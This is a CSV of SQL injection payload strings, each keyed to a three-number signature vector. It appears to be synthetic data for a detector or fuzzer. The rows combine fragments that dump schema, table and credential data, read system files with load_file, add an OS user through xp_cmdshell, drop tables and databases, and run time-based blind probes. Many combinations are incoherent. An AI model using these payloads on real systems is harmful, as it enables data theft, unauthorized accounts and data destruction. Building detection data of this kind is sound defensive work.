sig_vector,sig_string
"[5, 82, 36]",) and  drop table sc3； (select @@version）
"[6, 82, 56]"," 1)) or  drop table sc3；union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[36, 57, 36]"," (select @@version）union select 1,@@datadir,3 (select @@version）"
"[58, 56, 36]"," (select count(*) from sysobjects)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version）"
"[4, 47, 36]","' and union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[46, 36, 19]",1 (select @@version） or'1'='1
"[20, 54, 80]"," exists (select * from sysobjects)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 and 1=1;"
"[34, 82, 27]", INSERT INTO drop table sc3； select * from users where id=1
"[3, 49, 1]","'')) or union select 1,2,load_file('C://1.txt')') or"
"[21, 57, 14]"," select * from users where id=1 union select 1,@@datadir,3 or "
"[30, 33, 78]"," select version() exec master..xp_cmdshell ' = 1 union select 1,2,3  /*"
"[56, 14, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) or  (select @@version）"
"[36, 13, 36]", (select @@version） admin' (select @@version）
"[36, 32, 36]"," (select @@version） union select 1,2,(database())  (select @@version）"
"[54, 14, 36]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or  (select @@version）"
"[35, 32, 36]"," delete table dirs  union select 1,2,(database())  (select @@version）"
"[82, 32, 0]"," drop table sc3； union select 1,2,(database()) '' or"
"[50, 82, 21]", 1 = 2 union all select user()  drop table sc3； select * from users where id=1 
"[4, 32, 36]","' and  union select 1,2,(database())  (select @@version）"
"[22, 32, 36]"," union select 1,2 union select 1,2,(database())  (select @@version）"
"[50, 82, 6]", 1 = 2 union all select user()  drop table sc3； 1)) or 
"[50, 57, 6]"," 1 = 2 union all select user() union select 1,@@datadir,3 1)) or "
"[29, 4, 36]", drop database db' and  (select @@version）
"[3, 82, 54]","'')) or drop table sc3；union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 55, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  order by 1 (select @@version）"
"[17, 51, 27]"," ' and 1=2union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1"
"[54, 35, 42]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs exec master.dbo.sp_password null,username,password"
"[5, 4, 36]",) and ' and  (select @@version）
"[78, 32, 36]"," = 1 union select 1,2,3  /* union select 1,2,(database())  (select @@version）"
"[7, 44, 36]","and 0 ><create table dirs(paths varchar(100), id int) (select @@version）"
"[29, 51, 49]"," drop database dbunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,2,load_file('C://1.txt')"
"[6, 32, 35]"," 1)) or  union select 1,2,(database())  delete table dirs "
"[36, 54, 36]"," (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select @@version）"
"[36, 47, 36]"," (select @@version）union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[29, 16, 54]"," drop database db and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[3, 13, 36]",'')) or admin' (select @@version）
"[36, 82, 36]", (select @@version） drop table sc3； (select @@version）
"[3, 50, 54]","'')) or 1 = 2 union all select user() union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 62, 72]", 1)) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 2 --
"[6, 9, 36]", 1)) or  1 or  (select @@version）
"[19, 54, 36]"," or'1'='1union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select @@version）"
"[56, 17, 5]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) ' and 1=2) and "
"[9, 51, 6]"," 1 or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[15, 82, 32]"," and 1=2  drop table sc3； union select 1,2,(database()) "
"[35, 82, 56]"," delete table dirs  drop table sc3；union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[17, 78, 56]"," ' and 1=2 = 1 union select 1,2,3  /*union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[4, 44, 36]","' and create table dirs(paths varchar(100), id int) (select @@version）"
"[19, 47, 36]"," or'1'='1union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[3, 57, 36]","'')) orunion select 1,@@datadir,3 (select @@version）"
"[56, 10, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) + (select @@version）"
"[56, 57, 78]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 = 1 union select 1,2,3  /*"
"[56, 82, 78]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) drop table sc3； = 1 union select 1,2,3  /*"
"[13, 14, 36]", admin' or  (select @@version）
"[54, 32, 36]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  (select @@version）"
"[55, 32, 1]"," order by 1 union select 1,2,(database()) ') or"
"[35, 14, 36]", delete table dirs  or  (select @@version）
"[47, 58, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select count(*) from sysobjects) (select @@version）"
"[4, 32, 22]","' and  union select 1,2,(database())  union select 1,2"
"[47, 32, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,(database())  (select @@version）"
"[22, 55, 36]"," union select 1,2 order by 1 (select @@version）"
"[22, 62, 32]"," union select 1,2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,2,(database()) "
"[22, 36, 43]"," union select 1,2 (select @@version）exec master.dbo.xp_cmdshell 'net user username password /add'"
"[6, 50, 56]"," 1)) or  1 = 2 union all select user() union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[13, 44, 21]"," admin'create table dirs(paths varchar(100), id int) select * from users where id=1 "
"[56, 32, 78]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,2,(database())  = 1 union select 1,2,3  /*"
"[54, 57, 36]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,@@datadir,3 (select @@version）"
"[47, 57, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,@@datadir,3 (select @@version）"
"[6, 82, 32]"," 1)) or  drop table sc3； union select 1,2,(database()) "
"[22, 13, 36]"," union select 1,2 admin' (select @@version）"
"[19, 46, 36]", or'1'='11 (select @@version）
"[19, 10, 36]", or'1'='1 + (select @@version）
"[6, 4, 36]", 1)) or ' and  (select @@version）
"[54, 56, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,1,1,load_file(c:\\boot.ini) 
"
"[54, 82, 36]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3； (select @@version）"
"[6, 48, 36]", 1)) or (select user_name()) (select @@version）
"[19, 9, 36]", or'1'='1 1 or  (select @@version）
"[26, 82, 6]"," union select 1,1,1,load_file(c:\\boot.ini) 
 drop table sc3； 1)) or "
"[25, 56, 36]"," updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version）"
"[33, 14, 78]"," exec master..xp_cmdshell ' or  = 1 union select 1,2,3  /*"
"[51, 0, 36]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3'' or (select @@version）"
"[32, 59, 36]"," union select 1,2,(database())  (select count(*) from admin where len(*)>0) (select @@version）"
"[6, 82, 8]", 1)) or  drop table sc3；and( 
"[6, 32, 82]"," 1)) or  union select 1,2,(database())  drop table sc3；"
"[56, 51, 33]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exec master..xp_cmdshell '"
"[40, 36, 36]",(select IS_MEMBER('db_owner')) (select @@version） (select @@version）
"[54, 27, 36]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select * from users where id=1 (select @@version）"
"[47, 33, 68]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  exec master..xp_cmdshell ' */"
"[36, 78, 0]"," (select @@version） = 1 union select 1,2,3  /*'' or"
"[4, 78, 32]","' and  = 1 union select 1,2,3  /* union select 1,2,(database()) "
"[18, 82, 36]", && drop table sc3； (select @@version）
"[56, 25, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) updatexml(1,concat(0x7e,(select @@version),0x7e),1)  (select @@version）"
"[56, 6, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1)) or  (select @@version）"
"[56, 82, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 82, 33]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3； exec master..xp_cmdshell '"
"[51, 29, 36]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop database db (select @@version）"
"[36, 9, 62]", (select @@version） 1 or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[19, 32, 35]"," or'1'='1 union select 1,2,(database())  delete table dirs "
"[47, 82, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3； (select @@version）"
"[6, 78, 54]"," 1)) or  = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 6, 36]", 1)) or  1)) or  (select @@version）
"[56, 6, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1)) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[56, 32, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[51, 82, 38]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3； (select Count(*) from table)>0"
"[54, 82, 52]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3； sleep(5)"
"[45, 82, 62]","extractvalue(1, concat(0x7e,@@version,0x7e)) drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[6, 60, 36]"," 1)) or ord(mid(user(),1,1))=114 (select @@version）"
"[17, 14, 36]", ' and 1=2 or  (select @@version）
"[51, 10, 36]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 + (select @@version）"
"[6, 18, 62]", 1)) or  && 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[49, 82, 36]"," union select 1,2,load_file('C://1.txt') drop table sc3； (select @@version）"
"[62, 54, 22]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2"
"[6, 82, 54]"," 1)) or  drop table sc3；union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 29, 54]"," 1)) or  drop database dbunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[51, 78, 36]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /* (select @@version）"
"[51, 57, 13]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,@@datadir,3 admin'"
"[6, 32, 23]"," 1)) or  union select 1,2,(database())  union select 1,username,password from users where id=2"
"[12, 6, 36]",1 ' 1)) or  (select @@version）
"[17, 32, 6]"," ' and 1=2 union select 1,2,(database())  1)) or "
"[61, 36, 36]", 1=(select name from master.dbo.sysdatabases where id=1) (select @@version） (select @@version）
"[3, 49, 35]","'')) or union select 1,2,load_file('C://1.txt') delete table dirs "
"[56, 6, 44]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1)) or create table dirs(paths varchar(100), id int)"
"[55, 36, 26]"," order by 1 (select @@version） union select 1,1,1,load_file(c:\\boot.ini) 
"
"[16, 82, 36]", and  drop table sc3； (select @@version）
"[62, 53, 47]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= if(length(database())=8,sleep(5),1)union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[56, 48, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)(select user_name()) (select @@version）"
"[56, 78, 80]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) = 1 union select 1,2,3  /* and 1=1;"
"[78, 57, 55]"," = 1 union select 1,2,3  /*union select 1,@@datadir,3 order by 1"
"[49, 44, 57]"," union select 1,2,load_file('C://1.txt')create table dirs(paths varchar(100), id int)union select 1,@@datadir,3"
"[3, 47, 26]","'')) orunion select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,1,1,load_file(c:\\boot.ini) 
"
"[56, 36, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[47, 32, 2]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,(database()) ‘"
"[3, 32, 62]","'')) or union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[3, 19, 36]",'')) or or'1'='1 (select @@version）
"[3, 6, 36]",'')) or 1)) or  (select @@version）
"[6, 15, 27]", 1)) or  and 1=2  select * from users where id=1
"[6, 82, 82]", 1)) or  drop table sc3； drop table sc3；
"[56, 31, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) benchmark(3000000,MD5(1)) (select @@version）"
"[56, 30, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) select version() (select @@version）"
"[49, 32, 57]"," union select 1,2,load_file('C://1.txt') union select 1,2,(database()) union select 1,@@datadir,3"
"[56, 82, 7]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) drop table sc3；and 0 ><"
"[26, 32, 50]"," union select 1,1,1,load_file(c:\\boot.ini) 
 union select 1,2,(database())  1 = 2 union all select user() "
"[47, 3, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 '')) or (select @@version）"
"[17, 36, 36]", ' and 1=2 (select @@version） (select @@version）
"[13, 11, 62]", admin' ) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[56, 19, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) or'1'='1 (select @@version）"
"[78, 78, 18]"," = 1 union select 1,2,3  /* = 1 union select 1,2,3  /* &&"
"[47, 27, 79]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1--+"
"[47, 39, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select IS_SRVROLEMEMBER('sysadmin')) (select @@version）"
"[56, 36, 82]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） drop table sc3；"
"[6, 49, 82]"," 1)) or  union select 1,2,load_file('C://1.txt') drop table sc3；"
"[3, 32, 78]","'')) or union select 1,2,(database())  = 1 union select 1,2,3  /*"
"[3, 82, 7]",'')) or drop table sc3；and 0 ><
"[68, 57, 36]"," */union select 1,@@datadir,3 (select @@version）"
"[29, 32, 19]"," drop database db union select 1,2,(database())  or'1'='1"
"[51, 50, 56]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1 = 2 union all select user() union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[67, 43, 76]","';--exec master.dbo.xp_cmdshell 'net user username password /add' ;insert into users(id,username,password) values('100','new','new');"
"[56, 35, 80]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) delete table dirs  and 1=1;"
"[56, 57, 50]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 1 = 2 union all select user() "
"[1, 82, 36]",') or drop table sc3； (select @@version）
"[56, 57, 82]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 drop table sc3；"
"[56, 32, 82]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,2,(database())  drop table sc3；"
"[30, 49, 36]"," select version() union select 1,2,load_file('C://1.txt') (select @@version）"
"[21, 10, 51]"," select * from users where id=1  +union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[61, 32, 36]"," 1=(select name from master.dbo.sysdatabases where id=1) union select 1,2,(database())  (select @@version）"
"[35, 36, 36]", delete table dirs  (select @@version） (select @@version）
"[56, 36, 22]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） union select 1,2"
"[56, 58, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select count(*) from sysobjects) (select @@version）"
"[3, 6, 1]",'')) or 1)) or ') or
"[32, 36, 0]"," union select 1,2,(database())  (select @@version）'' or"
"[56, 1, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)') or 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[15, 47, 36]"," and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[56, 9, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1 or  (select @@version）"
"[56, 57, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[1, 57, 36]","') orunion select 1,@@datadir,3 (select @@version）"
"[9, 57, 36]"," 1 or union select 1,@@datadir,3 (select @@version）"
"[56, 36, 47]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version）union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[78, 6, 2]"," = 1 union select 1,2,3  /* 1)) or ‘"
"[31, 3, 36]"," benchmark(3000000,MD5(1))'')) or (select @@version）"
"[56, 32, 4]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,2,(database()) ' and "
"[44, 19, 50]","create table dirs(paths varchar(100), id int) or'1'='1 1 = 2 union all select user() "
"[1, 32, 36]","') or union select 1,2,(database())  (select @@version）"
"[56, 1, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)') or (select @@version）"
"[23, 78, 36]"," union select 1,username,password from users where id=2 = 1 union select 1,2,3  /* (select @@version）"
"[17, 44, 36]"," ' and 1=2create table dirs(paths varchar(100), id int) (select @@version）"
"[4, 7, 36]",' and and 0 >< (select @@version）
"[20, 47, 36]"," exists (select * from sysobjects)union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[62, 15, 54]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 11, 36]", 1)) or  ) or  (select @@version）
"[56, 32, 19]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,2,(database())  or'1'='1"
"[55, 32, 27]"," order by 1 union select 1,2,(database())  select * from users where id=1"
"[6, 34, 29]", 1)) or  INSERT INTO drop database db
"[50, 57, 36]"," 1 = 2 union all select user() union select 1,@@datadir,3 (select @@version）"
"[56, 82, 16]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) drop table sc3； and "
"[47, 44, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 create table dirs(paths varchar(100), id int) (select @@version）"
"[11, 36, 72]", ) or  (select @@version） = 2 --
"[6, 57, 23]"," 1)) or union select 1,@@datadir,3 union select 1,username,password from users where id=2"
"[53, 32, 36]"," if(length(database())=8,sleep(5),1) union select 1,2,(database())  (select @@version）"
"[26, 57, 62]"," union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,@@datadir,3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[26, 82, 62]"," union select 1,1,1,load_file(c:\\boot.ini) 
 drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[56, 54, 13]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 admin'"
"[56, 47, 53]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  if(length(database())=8,sleep(5),1)"
"[6, 36, 15]", 1)) or  (select @@version） and 1=2 
"[50, 23, 26]"," 1 = 2 union all select user()  union select 1,username,password from users where id=2 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[56, 36, 13]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） admin'"
"[68, 36, 62]", */ (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[53, 57, 36]"," if(length(database())=8,sleep(5),1)union select 1,@@datadir,3 (select @@version）"
"[6, 44, 36]"," 1)) or create table dirs(paths varchar(100), id int) (select @@version）"
"[6, 6, 20]", 1)) or  1)) or  exists (select * from sysobjects)
"[56, 6, 7]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1)) or and 0 ><"
"[27, 32, 62]"," select * from users where id=1 union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[56, 56, 5]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)) and "
"[56, 30, 78]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) select version() = 1 union select 1,2,3  /*"
"[36, 32, 47]"," (select @@version） union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[27, 32, 19]"," select * from users where id=1 union select 1,2,(database())  or'1'='1"
"[6, 32, 9]"," 1)) or  union select 1,2,(database())  1 or "
"[56, 36, 17]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） ' and 1=2"
"[56, 36, 53]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） if(length(database())=8,sleep(5),1)"
"[56, 36, 52]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select @@version） sleep(5)"
"[6, 1, 36]", 1)) or ') or (select @@version）
"[42, 57, 62]","exec master.dbo.sp_password null,username,passwordunion select 1,@@datadir,3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[56, 60, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)ord(mid(user(),1,1))=114 (select @@version）"
"[47, 6, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or  (select @@version）"
"[56, 44, 36]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)create table dirs(paths varchar(100), id int) (select @@version）"
"[37, 3, 62]", WAITFOR DELAY '0:0:5''')) or 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[78, 46, 36]"," = 1 union select 1,2,3  /*1 (select @@version）"
"[51, 16, 36]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 and  (select @@version）"
"[16, 57, 36]"," and union select 1,@@datadir,3 (select @@version）"
"[0, 36, 17]",'' or (select @@version） ' and 1=2
"[47, 47, 64]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 --"
"[56, 6, 6]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1)) or  1)) or "
"[51, 13, 35]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 admin' delete table dirs "
"[26, 44, 21]"," union select 1,1,1,load_file(c:\\boot.ini) 
create table dirs(paths varchar(100), id int) select * from users where id=1 "
"[56, 59, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select count(*) from admin where len(*)>0) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[47, 1, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') or (select @@version）"
"[44, 6, 36]","create table dirs(paths varchar(100), id int) 1)) or  (select @@version）"
"[47, 60, 82]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ord(mid(user(),1,1))=114 drop table sc3；"
"[5, 49, 81]",") and  union select 1,2,load_file('C://1.txt') create table test like users;"
"[6, 54, 67]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3';--"
"[6, 34, 67]", 1)) or  INSERT INTO';--
"[6, 50, 78]"," 1)) or  1 = 2 union all select user()  = 1 union select 1,2,3  /*"
"[19, 24, 80]"," or'1'='1 1=(if((user() regexp '^r'),1,0)) and 1=1;"
"[10, 54, 82]"," +union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；"
"[6, 34, 78]"," 1)) or  INSERT INTO = 1 union select 1,2,3  /*"
"[6, 54, 72]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 2 --"
"[6, 32, 57]"," 1)) or  union select 1,2,(database()) union select 1,@@datadir,3"
"[6, 36, 67]", 1)) or  (select @@version）';--
"[6, 36, 78]"," 1)) or  (select @@version） = 1 union select 1,2,3  /*"
"[6, 5, 54]"," 1)) or ) and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[19, 50, 23]"," or'1'='1 1 = 2 union all select user()  union select 1,username,password from users where id=2"
"[5, 54, 81]",") and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 create table test like users;"
"[5, 34, 81]",) and  INSERT INTO create table test like users;
"[6, 49, 67]"," 1)) or  union select 1,2,load_file('C://1.txt')';--"
